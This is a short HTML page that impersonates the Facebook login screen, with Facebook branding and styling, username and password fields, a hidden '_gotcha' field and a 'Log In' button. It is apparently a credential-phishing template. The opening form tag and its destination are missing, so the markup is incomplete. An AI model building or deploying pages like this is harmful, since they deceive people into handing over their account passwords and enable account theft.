<!DOCTYPE html>
<html>
<head>
<title>Facebook</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {font-family: Helvetica, Arial, sans-serif; margin: 0; padding: 20px; background: #f0f2f5;}
.form {display: flex; flex-direction: column; max-width: 350px; margin: 0 auto;}
input {width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; font-size: 16px;}
.btn {background: #1877f2; color: white; padding: 12px; border: none; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: bold;}

.logo img {width: 180px; height: 40px;}
</style>
</head>
<body>
<div class="logo">
<img src="https://upload.wikimedia.org/wikipedia/commons/c/c2/Facebook_favicon_%281%29.png" alt="Facebook">
</div>

<label>Username or Email</label>
<input type="text" name="username" required>
<label>Password</label>
<input type="password" name="password" required>
<input type="hidden" name="_gotcha" value="1">
<button type="submit" class="btn">Log In</button>
</form>
</body>
